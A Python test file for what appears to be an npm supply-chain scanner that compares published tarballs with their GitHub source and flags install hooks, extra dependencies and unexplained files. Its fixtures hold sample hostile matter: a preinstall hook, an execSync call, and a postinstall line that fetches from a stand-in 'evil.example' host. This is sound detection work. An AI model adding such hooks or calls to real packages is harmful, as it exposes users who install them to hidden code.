"""Tarball-vs-repo comparison: locating the commit, comparing trees, and the rules over it."""

import threading
import time
from collections.abc import Mapping
from concurrent.futures import ThreadPoolExecutor
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import pytest

from conftest import Router, TarEntry, make_tar_gz
from kitsunox.core.models import (
    Candidate,
    Change,
    PackageVersionRef,
    PublishInfo,
    Severity,
    VersionSnapshot,
)
from kitsunox.ecosystems.npm.repo import NpmLocator, release_tags
from kitsunox.ecosystems.npm.rules.correlate import DependencyNotInRepo, InstallScriptNotInRepo
from kitsunox.githost.github import GitHub, GitHubRepo, RepoFacts
from kitsunox.rules.repo import CodeDiffersFromRepo, CodeNotInRepo, EstablishedMatch, RepoCompared
from kitsunox.stages.correlate import CorrelationContext
from kitsunox.stages.repo import (
    ARCHIVES_IN_MEMORY,
    TRUST_FAILED,
    ManifestDifference,
    ReleaseSource,
    RepoComparison,
    RepoMemory,
    RepoTrust,
    compare,
    compare_pool,
    compare_trees,
    with_trust,
)
from kitsunox.util.archive import ArtifactTree
from kitsunox.util.http import BlobStore, FetchMode, HttpFetcher, Snapshot

A, T = "a" * 40, "c" * 40
REFS_URL = "https://github.com/o/r.git/info/refs?service=git-upload-pack"


def change(version: str = "1.2.3", *, git_head: str | None = None, **manifest: Any) -> Change:
    snap = VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="@s/kx", version=version),
        publish=PublishInfo(git_head=git_head),
        manifest=manifest,
    )
    return Change(new=snap, previous=snap, repository_url="https://github.com/o/r")


def test_locator_prefers_githead_then_tags() -> None:
    locator = NpmLocator()
    tags = {"refs/tags/kx@1.2.3": T}
    assert locator.commit(change(git_head=A), tags) == (A, "gitHead")
    assert locator.commit(change(), tags) == (T, "tag kx@1.2.3")
    assert locator.commit(change("9.9.9"), tags) is None
    assert release_tags("@s/kx", "1.0.0")[:3] == ("v1.0.0", "1.0.0", "@s/kx@1.0.0")


def test_locator_directory_is_a_plain_relative_path() -> None:
    locator = NpmLocator()
    repo = GitHubRepo("o", "r")
    assert locator.repository(change(repository={"directory": "./packages/kx/"})) == (
        repo,
        "packages/kx",
    )
    assert locator.repository(change(repository={"directory": "../../etc"})) == (repo, "")
    assert locator.repository(change().model_copy(update={"repository_url": None})) is None


def test_compare_trees() -> None:
    package = {
        "a.js": b"x\r\n",  # same once line endings are normalised
        "b.js": b"evil",
        "setup_bun.js": b"payload",  # root is in the repo; nothing compiles to it
        "lib/x.js": b"compiled",  # lib/x.ts is in the repo
        "dist/y.js": b"built",  # dist/ isn't in the repo at all
        "README.md": b"not code",
    }
    repo = {"a.js": b"x\n", "b.js": b"good", "lib/x.ts": b"src", "README.md": b"other"}
    found = compare_trees(package, repo)
    assert (found.code_files, found.identical, found.differing) == (5, 1, ["b.js"])
    assert found.missing == ["dist/y.js", "lib/x.js", "setup_bun.js"]
    assert found.unexplained == ["setup_bun.js"]


def github(tmp_path: Path, router: Router) -> GitHub:
    fetcher = HttpFetcher(
        store=BlobStore(tmp_path / "b"),
        snapshot=Snapshot(),
        mode=FetchMode.RECORD,
        immutable_index=tmp_path / "i",
        client=router.client(),
    )
    return GitHub(fetcher)


def pkt(text: str) -> bytes:
    return f"{len(text) + 4:04x}".encode() + text.encode()


def test_compare_end_to_end(tmp_path: Path, router: Router) -> None:
    router.add_bytes(REFS_URL, pkt(f"{T} refs/tags/v1.2.3\n") + b"0000")
    router.add_bytes(
        f"https://codeload.github.com/o/r/tar.gz/{T}",
        make_tar_gz(
            [
                TarEntry(f"r-{T}/package.json", b'{"name": "@s/kx"}'),
                TarEntry(f"r-{T}/index.js", b"good"),
                TarEntry(f"r-{T}/util.js", b"u"),
            ]
        ),
    )
    package: Mapping[str, bytes] = {"index.js": b"evil", "util.js": b"u"}
    result = compare(change(), package, NpmLocator(), github(tmp_path, router))
    assert result.source is not None and result.source.how == "tag v1.2.3"
    assert result.source.directory == ""
    assert (result.code_files, result.identical, result.differing) == (2, 1, ("index.js",))
    missing = compare(change("2.0.0"), package, NpmLocator(), github(tmp_path, router))
    assert missing.unavailable == "no commit or tag for this version"


def test_compare_finds_the_package_in_a_monorepo(tmp_path: Path, router: Router) -> None:
    """No `repository.directory`: the root manifest is the workspace's, not the package's."""
    router.add_bytes(REFS_URL, pkt(f"{T} refs/tags/v1.2.3\n") + b"0000")
    root = b'{"name": "workspace", "private": true}'
    router.add_bytes(
        f"https://codeload.github.com/o/r/tar.gz/{T}",
        make_tar_gz(
            [
                TarEntry(f"r-{T}/package.json", root),
                TarEntry(f"r-{T}/node_modules/kx/package.json", b'{"name": "@s/kx"}'),
                TarEntry(
                    f"r-{T}/packages/kx/package.json",
                    b'{"name": "@s/kx", "scripts": {"postinstall": "node install.js"}}',
                ),
                TarEntry(f"r-{T}/packages/kx/install.js", b"fetch()"),
            ]
        ),
    )
    package: Mapping[str, bytes] = {
        "package.json": b'{"name": "@s/kx", "scripts": {"postinstall": "node install.js"}}',
        "install.js": b"fetch()",
    }
    result = compare(change(), package, NpmLocator(), github(tmp_path, router))
    assert result.source is not None and result.source.directory == "packages/kx"
    assert (result.identical, result.manifest) == (1, ())
    renamed = change().model_copy(
        update={
            "new": change().new.model_copy(
                update={"ref": PackageVersionRef(ecosystem="npm", name="other", version="1.2.3")}
            )
        }
    )
    missing = compare(renamed, package, NpmLocator(), github(tmp_path, router))
    assert missing.unavailable == "the repository has no manifest for this package"


def test_a_renamed_package_keeps_a_plain_root_manifest() -> None:
    """A fork or rename: no manifest has the release's name, and the root isn't a workspace."""
    locator = NpmLocator()
    assert locator.package_directory(change(), {"package.json": b'{"name": "old"}'}) == ""
    workspace = {"package.json": b'{"name": "old", "workspaces": ["packages/*"]}'}
    assert locator.package_directory(change(), workspace) is None
    assert locator.package_directory(change(), {"index.js": b""}) is None


def ctx(comparison: RepoComparison) -> CorrelationContext:
    return CorrelationContext(as_of=datetime(2026, 10, 28, tzinfo=UTC), repo=comparison)


def test_repo_rules() -> None:
    cand = Candidate(change=change())
    sources = RepoComparison(code_files=10, unexplained=("x.js",), unexplained_count=1)
    built = RepoComparison(code_files=10, not_in_repo_count=10)  # build output only
    differs = RepoComparison(code_files=2, identical=1, differing=("index.js",), differing_count=1)
    assert CodeNotInRepo().evaluate_candidate(cand, ctx(sources))
    assert not CodeNotInRepo().evaluate_candidate(cand, ctx(built))  # ships build output
    (found,) = CodeDiffersFromRepo().evaluate_candidate(cand, ctx(differs))
    assert found.evidence[0].path == "index.js"
    (info,) = RepoCompared().evaluate_candidate(cand, ctx(RepoComparison(unavailable="gone")))
    assert info.explanation == "No comparison: gone." and info.weight == 0


def test_manifest_differences_and_rules() -> None:
    package = {
        "package.json": b'{"scripts": {"preinstall": "node setup_bun.js", "build": "tsc"},'
        b' "dependencies": {"left-pad": "1", "evil": "1"}}'
    }
    repo = {"package.json": b'{"scripts": {"build": "tsc"}, "devDependencies": {"left-pad": "1"}}'}
    differences = NpmLocator().manifest_differences(package, repo)
    assert [(d.field, d.package, d.repo) for d in differences] == [
        ("scripts.preinstall", "node setup_bun.js", None),
        ("dependencies.evil", "1", None),
    ]
    assert NpmLocator().manifest_differences(package, {}) == ()  # no manifest in the repo
    comparison = RepoComparison(manifest=differences)
    cand = Candidate(change=change())
    (hook,) = InstallScriptNotInRepo().evaluate_candidate(cand, ctx(comparison))
    assert hook.severity == Severity.HIGH and hook.evidence[0].after == "node setup_bun.js"
    (dep,) = DependencyNotInRepo().evaluate_candidate(cand, ctx(comparison))
    assert dep.severity == Severity.LOW and "evil" in dep.explanation


def test_a_hook_the_repository_build_writes_is_a_note() -> None:
    """`nutui-react`: the build script adds `node postinstall.js` and copies
    `scripts/postinstall.js`; neither is in the repository's package.json."""
    hook = b"try { require('child_process').execSync('stats') } catch (e) {}\n"
    package = {
        "package.json": b'{"version": "3.0.24", "scripts": {"postinstall": "node postinstall.js"}}',
        "postinstall.js": hook,
    }
    build = b"pkg.scripts = {postinstall: 'node postinstall.js'}\ncopy('scripts/postinstall.js')\n"
    repo = {"package.json": b"{}", "scripts/postinstall.js": hook, "scripts/build.mjs": build}
    (diff,) = NpmLocator().manifest_differences(package, repo)
    assert diff.built_by == "scripts/build.mjs"
    (note,) = InstallScriptNotInRepo().evaluate_candidate(
        Candidate(change=change()), ctx(RepoComparison(manifest=(diff,)))
    )
    assert (
        note.severity == Severity.INFO
        and "`scripts/build.mjs` holds the command" in note.explanation
    )
    assert compare_trees(package, repo).unexplained == []  # the copied file is in the repo

    # The file it runs isn't the repository's: not built there, whatever a script says.
    changed = {**package, "postinstall.js": hook + b"fetch('https://evil.example')\n"}
    (diff,) = NpmLocator().manifest_differences(changed, repo)
    assert diff.built_by is None
    assert compare_trees(changed, repo).unexplained == ["postinstall.js"]
    # No repository file holds the command (only the hook file itself, which doesn't count).
    (diff,) = NpmLocator().manifest_differences(
        package, {k: v for k, v in repo.items() if k != "scripts/build.mjs"}
    )
    assert diff.built_by is None
    # An inline command names no file.
    inline = {"package.json": b'{"scripts": {"postinstall": "node -e x"}}'}
    (diff,) = NpmLocator().manifest_differences(
        inline, {"package.json": b"{}", "b.sh": b"node -e x"}
    )
    assert diff.built_by is None


def test_a_versioned_hook_command_matches_its_placeholder_in_the_build() -> None:
    package = {
        "package.json": b'{"version": "1.3.0",'
        b' "scripts": {"install": "node i.js resource x 1.3.0"}}',
        "i.js": b"install()",
    }
    repo = {
        "package.json": b"{}",
        "i.js": b"install()",
        "Makefile": b'"node i.js resource x ${VERSION}"',
    }
    (diff,) = NpmLocator().manifest_differences(package, repo)
    assert diff.built_by == "Makefile"


def test_archives_are_extracted_a_few_at_a_time_and_a_bad_one_once(
    tmp_path: Path, router: Router, monkeypatch: pytest.MonkeyPatch
) -> None:
    router.add_bytes(REFS_URL, pkt(f"{T} refs/tags/v1.2.3\n") + b"0000")
    router.add_bytes(
        f"https://codeload.github.com/o/r/tar.gz/{T}",
        make_tar_gz([TarEntry(f"r-{T}/package.json", b"{}"), TarEntry(f"r-{T}/a.js", b"a")]),
    )
    client = github(tmp_path, router)
    memory = RepoMemory()
    inside, most = 0, 0
    lock = threading.Lock()
    real = GitHub.extract

    def extract(self: GitHub, body: bytes, *, directory: str = "") -> ArtifactTree:
        nonlocal inside, most
        with lock:
            inside += 1
            most = max(most, inside)
        time.sleep(0.02)
        try:
            return real(self, body, directory=directory)
        finally:
            with lock:
                inside -= 1

    monkeypatch.setattr(GitHub, "extract", extract)
    with ThreadPoolExecutor(max_workers=8) as pool:
        results = list(
            pool.map(
                lambda _: compare(change(), {"a.js": b"a"}, NpmLocator(), client, memory=memory),
                range(16),
            )
        )
    assert all(r.identical == 1 for r in results)
    assert 1 <= most <= ARCHIVES_IN_MEMORY

    calls = 0

    def unreadable(self: GitHub, body: bytes, *, directory: str = "") -> ArtifactTree:
        nonlocal calls
        calls += 1
        raise ValueError("archive too large")

    monkeypatch.setattr(GitHub, "extract", unreadable)
    memory = RepoMemory()
    first, second = (
        compare(change(), {"a.js": b"a"}, NpmLocator(), client, memory=memory) for _ in range(2)
    )
    assert first.unavailable == second.unavailable == "archive: archive too large"
    assert calls == 1


def test_a_hook_the_previous_release_shipped_too_is_low() -> None:
    """v3: Pulumi's generated `install` hook is in every release and in no repository."""
    hook = {"install": "node scripts/install-pulumi-plugin.js resource command 1.3.0"}
    new = change("1.3.0", scripts=hook)
    previous = change(
        "1.2.9", scripts={"install": "node scripts/install-pulumi-plugin.js resource command 1.2.9"}
    ).new
    diff = ManifestDifference(field="scripts.install", package=hook["install"], repo=None)
    comparison = RepoComparison(manifest=(diff,))
    repeated = Candidate(change=new.model_copy(update={"previous": previous}))
    (low,) = InstallScriptNotInRepo().evaluate_candidate(repeated, ctx(comparison))
    assert (low.severity, low.weight) == (Severity.LOW, 1.0) and "isn't new here" in low.explanation
    first = Candidate(change=new.model_copy(update={"previous": change("1.2.9").new}))
    (high,) = InstallScriptNotInRepo().evaluate_candidate(first, ctx(comparison))
    assert high.severity is Severity.HIGH  # the release that adds the hook still fires


def test_a_pool_compares_exactly_as_threads_do(tmp_path: Path, router: Router) -> None:
    """`compare_pool`: extraction and comparison in worker processes, same results."""
    router.add_bytes(REFS_URL, pkt(f"{T} refs/tags/v1.2.3\n") + b"0000")
    router.add_bytes(
        f"https://codeload.github.com/o/r/tar.gz/{T}",
        make_tar_gz(
            [
                TarEntry(f"r-{T}/package.json", b'{"name": "workspace", "private": true}'),
                TarEntry(f"r-{T}/packages/kx/package.json", b'{"name": "@s/kx"}'),
                TarEntry(f"r-{T}/packages/kx/index.js", b"good"),
            ]
        ),
    )
    router.add_bytes(f"https://codeload.github.com/o/r/tar.gz/{'b' * 40}", b"not gzip")
    package: Mapping[str, bytes] = {"package.json": b'{"name": "@s/kx"}', "index.js": b"evil"}
    client = github(tmp_path, router)
    bad = change(git_head="b" * 40)
    threads = [compare(c, package, NpmLocator(), client) for c in (change(), bad)]
    with compare_pool() as pool:
        memory = RepoMemory(pool=pool)
        pooled = [compare(c, package, NpmLocator(), client, memory=memory) for c in (change(), bad)]
        again = compare(bad, package, NpmLocator(), client, memory=memory)  # remembered
    assert pooled == threads
    assert threads[0].differing == ("index.js",)
    assert (threads[1].unavailable or "").startswith("archive: ")
    assert again == threads[1]


# Repository trust: facts for clean comparisons, and `repo.established-match`.

FACTS_URL = "https://api.github.com/repos/o/r"
HEAD = "d" * 40
TRUST_REFS = {"refs/heads/main": HEAD}


def facts(**overrides: Any) -> dict[str, Any]:
    return {
        "full_name": "o/r",
        "fork": False,
        "archived": False,
        "created_at": "2024-01-01T00:00:00Z",
        "stargazers_count": 40,
        "default_branch": "main",
    } | overrides


def compare_url(commit: str = A, head: str = HEAD) -> str:
    return f"https://api.github.com/repos/o/r/compare/{commit}...{head}?per_page=1&page=2"


def clean(**overrides: Any) -> RepoComparison:
    return RepoComparison(
        source=ReleaseSource(repo="o/r", commit=A, how="gitHead"), code_files=3, identical=3
    ).model_copy(update=overrides)


def api_github(tmp_path: Path, router: Router, token: str | None = "t") -> GitHub:  # noqa: S107
    fetcher = HttpFetcher(
        store=BlobStore(tmp_path / "blobs"),
        snapshot=Snapshot(),
        mode=FetchMode.RECORD,
        client=router.client(),
    )
    return GitHub(fetcher, token=token)


def test_clean_means_every_code_file_identical_and_nothing_undeclared() -> None:
    assert clean().clean
    assert not clean(identical=2, differing_count=1).clean
    assert not clean(identical=2, not_in_repo_count=1).clean
    assert not clean(code_files=0, identical=0).clean
    assert not clean(unavailable="no commit or tag for this version").clean
    hook = ManifestDifference(field="scripts.postinstall", package="node x.js", repo=None)
    assert not clean(manifest=(hook,)).clean
    assert clean(manifest=(hook.model_copy(update={"built_by": "scripts/build.js"}),)).clean


def test_trust_for_a_clean_comparison(tmp_path: Path, router: Router) -> None:
    router.add_json(FACTS_URL, facts())
    router.add_json(compare_url(), {"status": "ahead", "ahead_by": 3, "behind_by": 0})
    memory = RepoMemory({GitHubRepo("o", "r"): TRUST_REFS})
    trusted = with_trust(clean(), api_github(tmp_path, router), memory)
    assert trusted.trust is not None and trusted.trust.on_default_branch
    assert trusted.trust.facts is not None and trusted.trust.facts.stars == 40
    for _ in range(3):  # once per run, whatever the number of versions
        with_trust(clean(), api_github(tmp_path, router), memory)
    assert router.requests == [FACTS_URL, compare_url()]


def test_no_trust_lookup_without_a_clean_comparison_or_a_token(
    tmp_path: Path, router: Router
) -> None:
    memory = RepoMemory({GitHubRepo("o", "r"): TRUST_REFS})
    dirty = clean(identical=2, differing_count=1)
    assert with_trust(dirty, api_github(tmp_path, router), memory) == dirty
    assert with_trust(clean(), api_github(tmp_path, router, token=None), memory) == clean()
    assert router.requests == []


def test_a_fork_is_not_compared_and_failures_are_one_text(tmp_path: Path, router: Router) -> None:
    memory = RepoMemory({GitHubRepo("o", "r"): TRUST_REFS})
    router.add_json(FACTS_URL, facts(fork=True))
    forked = with_trust(clean(), api_github(tmp_path, router), memory)
    assert forked.trust is not None and not forked.trust.on_default_branch
    assert router.requests == [FACTS_URL]

    router.add_json(FACTS_URL, {"message": "API rate limit exceeded"}, status=403)
    failed = with_trust(clean(), api_github(tmp_path / "2", router), RepoMemory())
    assert failed.trust == RepoTrust(unavailable=TRUST_FAILED)
    router.offline.add(FACTS_URL)
    offline = with_trust(clean(), api_github(tmp_path / "3", router), RepoMemory())
    assert offline.trust == RepoTrust(unavailable=TRUST_FAILED)


def trusted_candidate(published: str = "2026-10-28T00:00:00Z") -> Candidate:
    released = change().new.model_copy(
        update={"publish": PublishInfo(published_at=datetime.fromisoformat(published))}
    )
    return Candidate(change=change().model_copy(update={"new": released}))


def established(**fact_overrides: Any) -> CorrelationContext:
    trust = RepoTrust(
        facts=RepoFacts.model_validate(facts_model(**fact_overrides)), on_default_branch=True
    )
    return CorrelationContext(as_of=datetime(2026, 10, 28, tzinfo=UTC), repo=clean(trust=trust))


def facts_model(**overrides: Any) -> dict[str, Any]:
    raw = facts(**overrides)
    raw["stars"] = raw.pop("stargazers_count")
    return raw


def test_established_match() -> None:
    rule = EstablishedMatch()
    (found,) = rule.evaluate_candidate(trusted_candidate(), established())
    assert found.severity is Severity.INFO and found.weight == 0
    assert "default branch `main`" in found.explanation and "40 stars" in found.explanation
    for overrides in (
        {"fork": True},
        {"archived": True},
        {"stargazers_count": 4},
        {"created_at": "2026-10-01T00:00:00Z"},  # 27 days before the release
    ):
        assert rule.evaluate_candidate(trusted_candidate(), established(**overrides)) == (), (
            overrides
        )
    ctx = established()
    assert ctx.repo is not None and ctx.repo.trust is not None
    off_branch = ctx.repo.trust.model_copy(update={"on_default_branch": False})
    other = CorrelationContext(
        as_of=ctx.as_of, repo=ctx.repo.model_copy(update={"trust": off_branch})
    )
    assert rule.evaluate_candidate(trusted_candidate(), other) == ()
    dirty = CorrelationContext(
        as_of=ctx.as_of, repo=ctx.repo.model_copy(update={"identical": 2, "differing_count": 1})
    )
    assert rule.evaluate_candidate(trusted_candidate(), dirty) == ()
